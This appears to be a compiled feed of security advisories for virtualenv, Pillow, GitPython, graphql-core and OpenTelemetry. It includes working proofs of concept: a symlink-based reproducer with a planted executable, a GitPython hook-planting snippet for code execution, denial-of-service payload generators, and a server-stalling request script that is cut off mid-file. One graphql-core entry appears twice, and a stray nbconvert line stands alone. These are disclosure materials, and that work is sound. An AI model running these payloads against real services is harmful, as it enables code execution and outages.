entry.title: [virtualenv] virtualenv: Generated files can follow existing destination links
entry.content:
Summary

Generated activation files and pyvenv.cfg can follow existing links and write outside the requested environment. The template writer tests exists() before unlinking, which misses dangling symlinks; the configuration writer opens the existing path directly.

Anthropic's OSS Scanner reported this as ANT-2026-XBEOCBS1 in virtualenv-20261015-005, received on 15 October 2026.

Affected area

Final file entries written during environment creation and seeding.

Attacker-controlled input

Another account must be able to prepare file links in the destination before creation. The invoking user must have write permission at the linked target. The destination parent must remain controlled during creation; concurrent parent-directory replacement is a separate concern.

Affected code

The relevant 21.14.8 source is in template writer, configuration writer.

Mechanism

ViaTemplateActivator._generate() removes an existing output only when Path.exists() is true. A dangling symlink therefore survives, and write_bytes() creates its target outside the environment. Other generated files have related final-entry behavior. PyEnvCfg.write() opens pyvenv.cfg without first replacing an existing link; a symlink or hard link there can overwrite an existing target. These paths require a prepared destination tree and the invoking user's permission to write the linked target.

Reproduction and evidence

The scanner's project tree contains venv/bin/activate -> ../../../.bash_aliases and an executable venv/bin/basename. Before creation, a new interactive bash does not create the marker. A plain virtualenv venv writes the activation script through the dangling link, creating ~/.bash_aliases as a regular file. Debian's stock .bashrc sources that file; the next interactive bash adds venv/bin to PATH and the planted basename writes the marker. The reproducer checks that the link remains, ~/.bash_aliases appears, and the second shell executes the planted file. A separate manual check links pyvenv.cfg to ~/.bashrc and observes the latter replaced with generated configuration text.

The link lets creation write outside the requested environment. The attacker chooses the target path but the generated bytes come from virtualenv. The executable in the example was already in the prepared tree; this finding is not arbitrary code injection into an otherwise trusted destination. The scanner traces the template behavior to #1454, first released in 20.0.0b1. PR #3431 replaces pre-existing output links and uses exclusive creation for generated text. It does not make a destination safe if another account can replace parent directories during creation.

Attack sequence

sequenceDiagram
    participant A as Prepared project tree
    participant V as virtualenv writer
    participant H as User home
    participant B as Next interactive bash
    A->>V: venv/bin/activate links to missing ~/.bash_aliases
    V->>V: Path.exists() follows link and returns false
    V->>H: write activation bytes through link
    H-->>B: ~/.bash_aliases now exists
    B->>H: .bashrc sources ~/.bash_aliases
    B->>A: PATH reaches planted venv/bin/basename
    A-->>B: marker created
    Note over V,H: pyvenv.cfg can also overwrite an existing linked target

Reproducer files

The following files are from the scanner report for ANT-2026-XBEOCBS1. They were tested against commit a857a7823c73 in the scanner image. The repro entrypoint expects companion files under /tmp/repro.d; cases that change user IDs need a disposable root-capable container. The last output line is BUG when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update.

repro

#!/usr/bin/env python3
import os
import shutil
import subprocess
import sys
import tempfile

# set up: a fresh home with Debian's stock ~/.bashrc, which sources ~/.bash_aliases when that file exists
home = tempfile.mkdtemp(prefix="home-")
shutil.copy("/etc/skel/.bashrc", f"{home}/.bashrc")
bash_aliases = f"{home}/.bash_aliases"
marker = f"{home}/attacker-ran"
open_terminal = ["bash", "-i", "-c", "true"]
terminal_env = {"HOME": home, "PATH": "/usr/bin:/bin", "TERM": "dumb"}

# the attacker's repository, cloned by the user to ~/proj
checkout = f"{home}/proj"
subprocess.run([sys.executable, "/tmp/repro.d/make_hostile_checkout.py", checkout], check=True)
activate = f"{checkout}/venv/bin/activate"
print("shipped: venv/bin/activate ->", os.readlink(activate), flush=True)

# a terminal opened before virtualenv runs does not touch the checkout (stderr: bash -i without a tty warns)
subprocess.run(open_terminal, env=terminal_env, stderr=subprocess.DEVNULL, check=True)
print("before virtualenv: ~/.bash_aliases exists:", os.path.lexists(bash_aliases), "| marker exists:", os.path.exists(marker), flush=True)
assert not os.path.lexists(bash_aliases) and not os.path.exists(marker)

# trigger: the user creates an environment in the checkout, then opens a new terminal
subprocess.run(["virtualenv", "--no-periodic-update", "venv"], cwd=checkout, env={**os.environ, "HOME": home}, check=True)
subprocess.run(open_terminal, env=terminal_env, stderr=subprocess.DEVNULL, check=True)

# check: the activation script belongs in venv/bin/activate; it must not be written through the link to ~/.bash_aliases
print("venv/bin/activate is still the symlink:", os.path.islink(activate))
written_outside = os.path.isfile(bash_aliases) and not os.path.islink(bash_aliases)
print("~/.bash_aliases created as a regular file:", written_outside)
if written_outside:
    print("  its first line:", open(bash_aliases).readline().rstrip())
attacker_code_ran = os.path.exists(marker)
print("after a new terminal, marker exists:", attacker_code_ran)
if attacker_code_ran:
    print("  it says:", open(marker).read().rstrip())
print("BUG" if written_outside and attacker_code_ran else "OK")

repro.d/fake_basename.sh

#!/bin/sh
echo "attacker code ran as $(id -un)" > "$HOME/attacker-ran"
exec /usr/bin/basename "$@"

repro.d/make_hostile_checkout.py

import os
import shutil
import sys

checkout = sys.argv[1]
bin_dir = os.path.join(checkout, "venv", "bin")
os.makedirs(bin_dir)

# venv/bin/../../.. is the directory holding the checkout, i.e. ~ for a clone at ~/proj; ~/.bash_aliases does not exist
os.symlink("../../../.bash_aliases", os.path.join(bin_dir, "activate"))

# the bash activation script runs $(basename "$VIRTUAL_ENV") right after putting venv/bin first on PATH
fake_basename = os.path.join(bin_dir, "basename")
shutil.copy(os.path.join(os.path.dirname(__file__), "fake_basename.sh"), fake_basename)
os.chmod(fake_basename, 0o755)

Impact

Creation can overwrite or create files outside the requested environment with the invoking user's permissions. File contents are constrained by what virtualenv generates.

Severity: medium. CVSS 4.5, CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L, assigned during maintainer review.

Versions tested

The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected version or exclude earlier releases. Fixed in 21.14.9.

The fix replaces existing entries, including symbolic and hard links, and exclusively creates generated text files. Before stdlib creation it replaces executable-directory symlinks and Windows junctions with real directories. It then removes symbolic and hard links inside that directory, including interpreter executables and DLLs, and at the configuration and ignore file paths. This also removes unrelated links directly in the executable directory. Final seed-launcher links are replaced. Exclusive creation protects the final text-file open; delegated stdlib and distlib writes still require a destination protected from concurrent replacement.

Fix: PR #3431.

Known mitigation

Use a fresh destination beneath an owner-controlled parent. Avoid creation over a tree populated by another account.

Affected release

  • The problem reproduces on virtualenv 21.14.8.

Credits

Reported by Anthropic's OSS Scanner as ANT-2026-XBEOCBS1.

References

entry.title: [pillow] Pillow: Bundled libopenjp2 2.5.4 in all wheels since 11.1.0 carries OSV-2025-219 heap-buffer-overflow write reachable from Image.open().load()
entry.content:
Summary

Every Pillow wheel from 11.1.0 onward bundles a libopenjp2 containing a heap-buffer-overflow write that is fixed upstream on master but has never appeared in an OpenJPEG release. See https://osv.dev/vulnerability/OSV-2025-219

Because the wheel bundles its own copy, a patched host OS does not help. It is reachable from Image.open(fp); im.load() with default settings.

I am reporting it here rather than only upstream because Pillow is where the vulnerable binary actually reaches users.

Note the inversion that makes this easy to miss: OpenJPEG 2.5.2 and earlier are safe. The bug was introduced in 954c6e3c (2024-06-25), so keeping the dependency current is what creates the exposure.

Details

Affected wheels

From .github/dependencies.json (openjpeg) at each tag:

Pillow bundled OpenJPEG status
10.4.0 2.5.2 safe
11.0.0 2.5.2 safe
11.1.0, 11.2.1, 11.3.0 2.5.3 affected
12.0.0 … 12.3.0 2.5.4 affected

Confirmed on an installed wheel: PIL.features.version_codec('jpg_2000') → 2.5.4, bundled file pillow.libs/libopenjp2-*.so.2.5.4. main still pins 2.5.4 as of 2026-10-06.

The defect

src/lib/openjp2/j2k.c, in opj_j2k_read_sod:

OPJ_UINT32 l_current_tile_part =
    l_cstr_index->tile_index[p_j2k->m_current_tile_number].current_tpsno;
l_cstr_index->tile_index[...].tp_index[l_current_tile_part].end_header = l_current_pos;
l_cstr_index->tile_index[...].tp_index[l_current_tile_part].end_pos   =
    l_current_pos + p_j2k->m_specific_param.m_decoder.m_sot_length + 2;

tp_index is neither null-checked nor bounds-checked, and l_current_tile_part comes directly from the one-byte TPsot field of the SOT marker.

The correct guard already exists a few lines later in opj_j2k_add_tlmarker (j2k.c:8459), writing the same array at the same index behind if (tp_index && l_current_tile_part < nb_tps). One writer checked, its sibling not.

Reached by giving the codestream a valid TLM marker — so tp_index is allocated once by opj_j2k_build_tp_index_from_tlm, sized to the TLM entry count, and opj_j2k_read_sot then skips all resizing — while setting TNsot = 0 in every SOT, which keeps the TLM "valid" and lets TPsot walk past the allocation.

Patch status

Fixed upstream in 91d08b11 ("Fix heap buffer overlfow in opj_j2k_read_sod", 2026-02-10).

The newest OpenJPEG tag is v2.5.4 (2025-09-20), and compare/v2.5.4...91d08b11 reports ahead 6, behind 0 — the fix is in no release, 8 months on.

Suggested remediation

  1. Carry 91d08b11 as a patch in the wheel build until an OpenJPEG release includes it — three lines, identical to a guard already present in the same file.
  2. Consider asking OpenJPEG to cut a release; they have had an unreleased memory-corruption fix on master since February 2026, and every distro is shipping the vulnerable code.
  3. Your security handbook already tells applications to block EPS at the application layer. A similarly explicit note that Image.open() ignores filename/Content-Type and will reach any compiled-in codec unless formats= is passed would help downstream apps a lot.

Not a Pillow bug, but relevant: the extension allowlist most apps rely on does not apply

Image.open() sniffs magic bytes, so a JPEG 2000 codestream in a file named avatar.png declared Content-Type: image/png reaches the JP2 decoder anyway.

I verified this against a production service documenting PNG/JPEG-only uploads: it accepted and fully decoded a JP2 through exactly that path, with 16 formats reachable from one upload endpoint against 43 registered openers. That service has since fixed it by passing formats= and validating on the detected format rather than the client's Content-Type.

That is the reason a decoder-level issue like this one has much wider reach than downstream maintainers tend to assume.

Proof of concept

ASan build of OpenJPEG 2.5.4 interposed under a stock Pillow 12.3.0, running Image.open(p); im.load():

==766332==ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 8
    #0 opj_j2k_read_sod          j2k.c:5086
    #1 opj_j2k_read_tile_header  j2k.c:9912
    #2 opj_read_tile_header      openjpeg.c:575
    #3 j2k_decode_entry          src/libImaging/Jpeg2KDecode.c:793
    #4 ImagingJpeg2KDecode       src/libImaging/Jpeg2KDecode.c:949
    #5 _decode                   src/decode.c:132
located 8 bytes to the right of a 24-byte region allocated by
    opj_j2k_build_tp_index_from_tlm j2k.c:8939

Frames 3–5 are Pillow's own decoder, not a synthetic harness. No non-default decoder options are involved; strict mode is on, which is Pillow's behaviour since Pillow never calls opj_decoder_set_strict_mode. A benign twin image runs the same path cleanly and returns a valid image, so this is the payload and not a parse failure.

I have deliberately not attached the PoC file to this initial report. I'm happy to attach the PoC, the builder script and the RIP-control harness here on request, or hold everything until a fix is ready.

No disclosure deadline from me; I will not publish anything while this is being worked on.

Impact

Any application that calls Image.open() / im.load() on an image it did not produce — the overwhelmingly common case for upload handlers, thumbnailers and preview pipelines — can be made to perform an out-of-bounds heap write by supplying one crafted file.

Floor, already certain. On a stock non-sanitised wheel the overflow performs 245 writes walking to +5856 bytes past a 24-byte allocation, and glibc's own heap-metadata checker aborts the process (corrupted size vs. prev_size, corrupted double-linked list, SIGABRT). One file reliably kills a long-lived worker.

Ceiling, demonstrated as a primitive but not as a finished exploit. With same-size-class objects alive on both sides — an ordinary busy heap — the walk crosses opj_event_mgr_t, which holds three opj_msg_callback function pointers, and opj_event_msg then calls one (event.c:136):

rip  0x4000    <- value chosen by the attacker's file layout
rsi  0x3ff2    <- m_error_data, written by the same walk

Shifting the codestream with a COM marker moves rip with it (0x16ce → 0x4000), so the instruction pointer is attacker-chosen rather than incidentally invalid. A benign control image leaves the same groomed heap untouched.

To be explicit about what I did not do: I have not built a working exploit. That additionally needs remote heap grooming and an ASLR defeat, and I attempted neither. I am reporting a controlled control-flow primitive, not a finished chain. The CVSS AC:H reflects that.

References

  • https://github.com/python-pillow/Pillow/security/advisories/GHSA-78g4-xqwv-q3g8
  • https://github.com/python-pillow/Pillow/commit/5f8114c8096b181fae493543cd3837d9f9a971cc
  • https://github.com/python-pillow/Pillow/commit/d3470c327840f4c216a1610f30e7091dfd0b97c0
  • https://github.com/uclouvain/openjpeg/commit/91d08b11a72764f6d199f32fa0c1b1abd4edc2ad
  • https://github.com/python-pillow/Pillow/releases/tag/13.0.0

entry.title: [Gitpython] GitPython validates a submodule's ".git" path only after cloning into it (RCE)
entry.content:
Summary

create_submodule(name, path, url) clones a submodule into the repo's own .git directory before it rejects the path. A path of ".git/hooks" is accepted by the pre-clone check, so the submodule is cloned straight into the live hooks directory, and a file named post-checkout in the submodule becomes an executable .git/hooks/post-checkout. On 3.2.0+ the later index check does raise ValueError, but only after the clone already wrote to disk, and it does not remove the planted hook; on 3.1.x there is no such check and the call succeeds silently. Either way the hook runs on the next git operation (e.g. checkout), giving code execution.

Details

The checkout path is validated too late, after the clone has already mutated disk. This breaks the "validate before mutation" invariant that commit 43a43cd8 ("Validate submodule checkout and metadata paths before mutation") set out to enforce.

Submodule.add() calls the permissive path check before cloning, and the strict check only reaches the ".git" alias at index time, after _clone_repo has written to disk:

git/objects/submodule/base.py (Submodule.add) 599: path = cls._to_relative_path(repo, path) # accepts ".git/hooks" 673: mrepo = cls._clone_repo(repo, url, path, name, ...) # clones into /.git/hooks 714: index.add([sm], write=True) # strict check only triggers here

git/index/base.py (IndexFile._preprocess_add_items) 732: _validate_repo_path(entry.path) # rejects ".git", too late

_to_relative_path only blocks ../absolute/out-of-tree paths; .git aliases are rejected only by _validate_repo_path, which was added in 3.2.0 (commit a75aedf3) and runs at the index boundary. The ValueError it raises at line 732 does not roll back what _clone_repo already wrote.

Version-dependent behavior:

  • 3.2.0 .. tip bda18e08: _validate_repo_path raises ValueError at index.add, but the hook is already on disk and is not removed (incorrect order of validation vs. clone).
  • 3.1.x (e.g. 3.1.59): _validate_repo_path does not exist and _to_relative_path does not reject .git; create_submodule(path=".git/hooks", ...) returns with no error at all and the hook is planted silently.

Proof of concept

Setup: evilsub/ : a git repo whose ROOT contains an executable file named post-checkout (the payload) victim/ : a git repo with at least 1 commit and a second branch, whose .git/hooks has NO sample hooks (the state of a minimal/CI checkout, or git init with an empty template dir, or GIT_TEMPLATE_DIR/init.templateDir empty)

import git, os.path as osp try: git.Repo("victim").create_submodule(name="x", path=".git/hooks", url=osp.abspath("evilsub")) except ValueError: pass # 3.2.0+: ".git" is rejected, but only AFTER the clone, so the plant already happened. # 3.1.x: no exception is raised at all; the call succeeds and still plants the hook.

victim/.git/hooks/post-checkout now exists, mode 0755, attacker-controlled, on every

affected version. Any later checkout runs it:

git -C victim checkout -> the hook runs -> code execution

Verified live:

  • tip bda18e08 (3.2.0 + 3 commits): create_submodule raised ValueError from git/index/base.py:732, yet .git/hooks/post-checkout was present and executable, and git checkout executed it.
  • 3.1.59: create_submodule returned with no error; .git/hooks/post-checkout was planted and executed by git checkout.

Impact

Arbitrary code execution. A library/app that creates a submodule from an attacker-influenced path ends up with an attacker-controlled executable in .git/hooks, which git runs on ordinary later operations. This affects any service that derives a submodule checkout path from untrusted data, e.g. one that ingests a submodule spec (name/path/url) from a user-supplied manifest or API request and feeds path into create_submodule. On 3.2.0+ the library's own validation is the thing that fails: it correctly rejects the .git path, but only after the submodule has already been cloned into place, so an app that traps the ValueError reasonably believes the unsafe path was blocked.

Preconditions (hence AC:H): (1) the app passes an attacker-influenced submodule path; (2) the target hook name is free in .git/hooks, true for minimal/CI/container checkouts and whenever init.templateDir/GIT_TEMPLATE_DIR is empty. With the default sample hooks present, git clone refuses the non-empty destination and no plant occurs.

Affected: all tested versions from 3.1.x (3.1.59) through the current tip bda18e08 (3.2.0 + 3 commits). 3.1.x plants silently; 3.2.0+ plants despite raising ValueError.

entry.title: [graphql-core] GraphQL-core: Denial of service via comment tokens bypassing the parser's max_tokens limit
entry.content:
Summary

The parser's max_tokens limit — the documented defence against oversized GraphQL documents — did not count comment tokens. A document padded with comments could therefore pass a max_tokens check of any size while still allocating one Token object per comment, all of which stay reachable for the lifetime of the parsed document. A 38 MB comment-padded payload allocated roughly 92 MB of additional resident memory with max_tokens=5 in force.

Details

Lexer.lookahead() reads tokens one at a time and skips over comments, returning only the first non-comment token. Each skipped comment is nevertheless fully tokenized, allocated as a Token object, and linked into the persistent token list via token.next / token.prev — the chain that powers source-location reporting, and which is retained as long as the document is.

Parser.advance_lexer() incremented the token counter only for the tokens the lexer actually returned. Comments were therefore invisible to the accounting, and max_tokens bounded only the non-comment tokens.

The practical consequence is a gap between what users reasonably believe max_tokens protects and what it did protect. The limit was not broken for ordinary documents — real tokens were still capped correctly — so the shortfall was not observable without specifically testing comment padding.

As with the companion issue, the payload compresses extremely well (# c\n repeated), so body-size limits and WAF inspection applied to the compressed request do not see its true size, while the framework decompresses it in memory before the parser is reached.

Proof of concept

import gc
import resource
from graphql import parse

# 100,000 comments, a 5-token query, and max_tokens=5 — accepted.
query = "# c\n" * 100_000 + "{ a }"
parse(query, max_tokens=5)          # no error raised

# Memory amplification.
big = "# padding comment used to amplify memory per token\n" * 500_000 + "{ a }"
gc.collect()
before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
parse(big, max_tokens=5)            # ~38 MB source
after = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
print(f"RSS delta: +{(after - before) / 1024:.0f} MB")

Measured on GraphQL-core 3.2.8 / CPython 3.12 / Linux x86_64: the 391 KB payload parsed in 127 ms, and the 38.1 MB payload produced an RSS delta of +92 MB — about 2.4× the source size, on top of the source string itself.

Impact

Denial of service through memory exhaustion. A modest number of concurrent requests can push a worker past a typical 256 MB or 512 MB container limit and trigger an OOM kill. No authentication is required, and no data is disclosed or modified.

Depth limiters and complexity analyzers do not help: they run on the AST after parsing has already succeeded, and the document contains only five real tokens.

Patches

Fixed in 3.2.12 and 3.3.0rc1.

Parser.advance_lexer now counts every token consumed, including the comment tokens the lexer skips between the previously focused token and the new one, and including the advance onto EOF so that trailing comments are covered. max_tokens therefore now bounds every Token the parser allocates.

Note the behaviour change: comments now count toward max_tokens. A comment-heavy document that was previously accepted may now be rejected. If you parse documents containing substantial comments — SDL files with documentation comments, for instance — and you set max_tokens, you may need to raise the limit. The token_count attribute of a parsed document likewise now includes comments.

Workarounds

If you cannot upgrade, apply a request body-size limit to the decompressed body before the document reaches parse().

Such a limit is worth keeping after upgrading as well: max_tokens is one guard among several and bounds the token count, not the overall cost of a request.

References

  • GraphQL specification § 2.1.4 — Comments

Credits

entry.title: [graphql-core] GraphQL-core: Denial of service via comment tokens bypassing the parser's max_tokens limit
entry.content:
Summary

The parser's max_tokens limit — the documented defence against oversized GraphQL documents — did not count comment tokens. A document padded with comments could therefore pass a max_tokens check of any size while still allocating one Token object per comment, all of which stay reachable for the lifetime of the parsed document. A 38 MB comment-padded payload allocated roughly 92 MB of additional resident memory with max_tokens=5 in force.

Details

Lexer.lookahead() reads tokens one at a time and skips over comments, returning only the first non-comment token. Each skipped comment is nevertheless fully tokenized, allocated as a Token object, and linked into the persistent token list via token.next / token.prev — the chain that powers source-location reporting, and which is retained as long as the document is.

Parser.advance_lexer() incremented the token counter only for the tokens the lexer actually returned. Comments were therefore invisible to the accounting, and max_tokens bounded only the non-comment tokens.

The practical consequence is a gap between what users reasonably believe max_tokens protects and what it did protect. The limit was not broken for ordinary documents — real tokens were still capped correctly — so the shortfall was not observable without specifically testing comment padding.

As with the companion issue, the payload compresses extremely well (# c\n repeated), so body-size limits and WAF inspection applied to the compressed request do not see its true size, while the framework decompresses it in memory before the parser is reached.

Proof of concept

import gc
import resource
from graphql import parse

# 100,000 comments, a 5-token query, and max_tokens=5 — accepted.
query = "# c\n" * 100_000 + "{ a }"
parse(query, max_tokens=5)          # no error raised

# Memory amplification.
big = "# padding comment used to amplify memory per token\n" * 500_000 + "{ a }"
gc.collect()
before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
parse(big, max_tokens=5)            # ~38 MB source
after = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
print(f"RSS delta: +{(after - before) / 1024:.0f} MB")

Measured on GraphQL-core 3.2.8 / CPython 3.12 / Linux x86_64: the 391 KB payload parsed in 127 ms, and the 38.1 MB payload produced an RSS delta of +92 MB — about 2.4× the source size, on top of the source string itself.

Impact

Denial of service through memory exhaustion. A modest number of concurrent requests can push a worker past a typical 256 MB or 512 MB container limit and trigger an OOM kill. No authentication is required, and no data is disclosed or modified.

Depth limiters and complexity analyzers do not help: they run on the AST after parsing has already succeeded, and the document contains only five real tokens.

Patches

Fixed in 3.2.12 and 3.3.0rc1.

Parser.advance_lexer now counts every token consumed, including the comment tokens the lexer skips between the previously focused token and the new one, and including the advance onto EOF so that trailing comments are covered. max_tokens therefore now bounds every Token the parser allocates.

Note the behaviour change: comments now count toward max_tokens. A comment-heavy document that was previously accepted may now be rejected. If you parse documents containing substantial comments — SDL files with documentation comments, for instance — and you set max_tokens, you may need to raise the limit. The token_count attribute of a parsed document likewise now includes comments.

Workarounds

If you cannot upgrade, apply a request body-size limit to the decompressed body before the document reaches parse().

Such a limit is worth keeping after upgrading as well: max_tokens is one guard among several and bounds the token count, not the overall cost of a request.

entry.title: [graphql-core] GraphQL-core: Denial of service via quadratic complexity in the OverlappingFieldsCanBeMerged validation rule
entry.content:
Summary

The OverlappingFieldsCanBeMerged validation rule can be driven into quadratic — and in the worst case O(n²·m²) — running time by a small, highly compressible query. A single 364 KB document can occupy one CPU core for over five minutes during validation, before any resolver runs. Because the rule is part of specified_rules and therefore enabled by default, every GraphQL-core based server is affected at default settings.

Details

OverlappingFieldsCanBeMerged compares every pair of fields that share a response name and recurses into their sub-selections. The memoization added for CVE-2023-26144 (GHSA-9pv7-vfvm-6vr7) is keyed by named fragment identity, so it does not cover this path: inline fragments are flattened into the parent selection set before the cache is consulted, and therefore every pair is re-compared from scratch at every nesting level.

Repeating an inline fragment that selects the same response name at two nesting levels multiplies the two effects. There was no comparison budget and no validation timeout, so the rule ran to completion regardless of cost.

The cost is incurred in the validation phase, which is what makes this hard to defend against from outside the library: query-depth limiters, complexity analyzers and cost estimators all operate on the parsed document after validation, and the malicious document is trivially shallow (depth 3, complexity 1). The payload is also one short string repeated many times, so it compresses to a few kilobytes and slips past body-size limits and WAF inspection that only see the compressed request.

Proof of concept

import time
from graphql import build_schema, parse, validate

schema = build_schema(
    "type Query { field: Node } type Node { f: Node, g: Node, x: String }"
)

def gen(n: int, m: int) -> str:
    inner = " ".join(["... on Node { x }"] * m)
    outer = " ".join([f"... on Node {{ f {{ {inner} }} }}"] * n)
    return f"{{ field {{ {outer} }} }}"

query = gen(200, 100)          # 364 KB, gzips to a few KB
document = parse(query)
start = time.perf_counter()
validate(schema, document)      # returns no errors — it just burns CPU
print(f"{(time.perf_counter() - start):.0f}s")

Measured on GraphQL-core 3.2.8 / CPython 3.12 / Linux x86_64:

n m query size validation time
20 20 7.6 KB 0.16 s
50 50 46 KB 5.2 s
100 100 182 KB 81 s
200 100 364 KB 319 s

Doubling n at fixed m quadruples the time, as expected for a quadratic outer loop driving a quadratic inner walk.

Impact

Denial of service. One request pins one worker process for minutes; because CPython holds the GIL for this pure-CPU work, a handful of concurrent requests can saturate a typical multi-worker deployment. No authentication is required, and no data is disclosed or modified.

Patches

Fixed in 3.2.12 and 3.3.0rc1.

Validation now enforces a per-document comparison budget. Once MAX_FIELD_COMPARISONS (default 250_000) pairwise comparisons have been made, the rule aborts and reports a GraphQLError instead of running to completion:

Query is too complex to validate for overlapping fields: exceeded 250000 field comparisons. Validation was aborted.

The default is far above what any realistic query reaches. It is a module-level constant and can be raised or lowered:

from graphql.validation.rules import overlapping_fields_can_be_merged

overlapping_fields_can_be_merged.MAX_FIELD_COMPARISONS = 1_000_000

Note the behaviour change: a pathological query that previously validated — slowly — now produces a validation error.

Workarounds

If you cannot upgrade, reject oversized documents before they reach validate(). Note that a request body-size limit must be applied to the decompressed body to be effective here, since the payload is highly compressible. Removing OverlappingFieldsCanBeMergedRule from the rule set is not a safe workaround: it is a correctness rule required by the specification.

A body-size limit remains worthwhile after upgrading — the comparison budget bounds this specific rule, not overall request cost.

Credits

Reported by @BZHunt, who also reviewed the fixes before release. In memory of ZaX, who was the driving force behind this discovery.

Independently found and diagnosed by @bcmyguest, who also proposed a fix.

nbconvert <= v7.17.1 has an arbitrary file write vulnerability due to a path traversal in ipynb cell output metadata, more specifically on the filename attribute.

entry.title: [opentelemetry-api] OpenTelemetry Python: Unbounded tracestate parsing in opentelemetry-api
entry.content:
Summary

TraceState.from_header splits the inbound W3C tracestate header with a regular expression that starts with an unbounded optional-whitespace run, and no length limit is applied first. A run of spaces or tabs that is not followed by a comma costs O(N²) CPU. A single unauthenticated request with a ~100 KB tracestate keeps the handling worker busy for ~6 s (spaces) to ~12 s (tabs); under an asyncio server it blocks every other connection for that time.

Affected component / version

  • Package: opentelemetry-api (pip) — opentelemetry/trace/span.py (TraceState.from_header), reached from opentelemetry/trace/propagation/tracecontext.py (TraceContextTextMapPropagator.extract).
  • Confirmed in main (5e8083e8) and in the v1.44.0 and v1.45.0 tags; the same pattern is present back to v1.0.0 (introduced by #1599, March 2021). Not exhaustively verified against every release in between.
  • Reachable with the default propagators (OTEL_PROPAGATORS defaults to tracecontext,baggage) from any server instrumentation that calls propagate.extract(), for example opentelemetry-instrumentation-asgi.

Details

  1. The header reaches the parser without any length check:
# opentelemetry-api/src/opentelemetry/trace/propagation/tracecontext.py:57
tracestate_headers = getter.get(carrier, self._TRACESTATE_HEADER_NAME)  # <-- attacker-controlled request header(s), any size
if tracestate_headers is None:
    tracestate = None
else:
    tracestate = TraceState.from_header(tracestate_headers)             # <-- no length check before parsing (line 61)
  1. The split pattern and the parser:
# opentelemetry-api/src/opentelemetry/trace/span.py:45
_TRACECONTEXT_MAXIMUM_TRACESTATE_KEYS = 32            # <-- only enforced later, in TraceState.__init__, after the split
_delimiter_pattern = re.compile(r"[ \t]*,[ \t]*")      # <-- (line 46) starts with an unbounded [ \t]*

# span.py:382
@classmethod
def from_header(cls, header_list: list[str]) -> TraceState:
    pairs = {}  # type: dict[str, str]
    for header in header_list:
        members: list[str] = re.split(_delimiter_pattern, header)   # <-- (line 400) VULNERABLE: O(N^2) on "a=b" + " " * N + "x"
        for member in members:
            if not member:
                continue
            match = _member_pattern.fullmatch(member)
            if not match:
                _logger.warning(                                    # <-- also logs the entire malformed member (up to the whole header)
                    "Member doesn't match the w3c identifiers format %s",
                    member,
                )
                return cls()
            ...

re.split tries the pattern at every offset. At each offset inside a whitespace run, [ \t]* consumes the rest of the run, finds no ,, backtracks and fails, then the engine moves one character forward and repeats. N characters × up to N steps each = O(N²). The 32-member limit never gets a chance to run because split has to finish first.

  1. The sibling propagator already has the missing guard:
# baggage/propagation/__init__.py:68
_MAX_HEADER_LENGTH = 8192
...
if len(header.encode()) > self._MAX_HEADER_LENGTH:   # <-- (line 93) rejected before any regex runs; tracestate has no equivalent
    _logger.warning(...)
    return context

A 16 KiB header costs ≈ 0.25 s and an 8 KiB header ≈ 0.07 s. Measured cost of extract() on one core (valid traceparent, tracestate: "a=b" + N spaces + "x"): the time quadruples each time N doubles (see the proof of concept). Roughly 0.06 s at 10,000 characters, 1 s at 40,000, 4 s at 80,000, 9 s at 100,000 (tabs are about 1.6× slower).

Whether a server lets such a header through (header-size limits, tested): gunicorn rejects ≥ 8190 bytes (response code 431); uvicorn --http h11 rejects above 16 KiB (400); waitress accepts up to 256 KiB (200 KB accepted, 300 KB rejected); uvicorn --http httptools — the default parser with uvicorn[standard] — accepted 300 KB, 1 MB, 5 MB and 20 MB tracestate headers.

Proof of concept

A. Show the quadratic cost (no server needed)

  1. Install the API: pip install opentelemetry-api (any version from 1.0 up to the current main is affected).
  2. Save as poc_tracestate.py:
import logging
import time

from opentelemetry.trace.propagation.tracecontext import TraceContextTextMapPropagator

# The library logs the whole malformed member at WARNING; silence it so the timings stay readable.
logging.disable(logging.CRITICAL)

TRACEPARENT = "00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01"
propagator = TraceContextTextMapPropagator()

previous = None
for n in (10_000, 20_000, 40_000, 80_000):
    # N spaces after a valid member, no comma anywhere in the header
    carrier = {"traceparent": TRACEPARENT, "tracestate": "a=b" + " " * n + "x"}
    start = time.perf_counter()
    propagator.extract(carrier)
    elapsed = time.perf_counter() - start
    growth = f"x{elapsed / previous:.1f}" if previous else "-"
    print(f"{n:>7} characters  {elapsed:6.2f} s  growth when size doubles: {growth}")
    previous = elapsed
  1. Run python poc_tracestate.py.
  2. What to observe: the time grows by about ×4 every time the input size doubles (a linear parser would show ×2). Absolute numbers depend on the CPU; the growth factor does not. Our run:
  10000 characters    0.06 s  growth when size doubles: -
  20000 characters    0.26 s  growth when size doubles: x4.0
  40000 characters    1.04 s  growth when size doubles: x4.0
  80000 characters    4.13 s  growth when size doubles: x4.0

Replace " " with "\t" to see ≈1.6× longer.

B. Show that one request stalls a real server

This uses OpenTelemetryMiddleware from opentelemetry-instrumentation-asgi around a trivial ASGI app and the default uvicorn[standard] parser (httptools).

  1. Install: pip install opentelemetry-api opentelemetry-instrumentation-asgi "uvicorn[standard]".
  2. Save as app.py:
from opentelemetry.instrumentation.asgi import OpenTelemetryMiddleware


async def app(scope, receive, send):
    await send({"type": "http.response.start", "status": 200, "headers": [(b"content-type", b"text/plain")]})
    await send({"type": "http.response.body", "body": b"ok"})


app = OpenTelemetryMiddleware(app)
  1. Start the server in one terminal: uvicorn app:app --host 127.0.0.1 --port 8000 --http httptools
  2. Save as attack.py:
"""Send one oversized tracestate request and, while it is being handled,
measure how long an unrelated request to the same server has to wait."""
import socket
import sys
import threading
import time

HOST, PORT = "127.0.0.1", 8000
N = int(sys.argv[1]) if len(sys.argv) > 1 else 100_000
TRACEPARENT = "00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01"


def get(path, extra=""):
    s = socket.create_connection((HOST, PORT), timeout=120)
    s.sendall(f"GET {path} HTTP/1.1\r\nHost: x\r\nConnection: close\r\n{extra}\r\n".encode())
    start, data = time.perf_counter(), b""
    while chunk := s.recv(65536):
        data += chunk
    return time.perf_counter() - start, data.split(b"\r\n")[0].decode()


result = {}
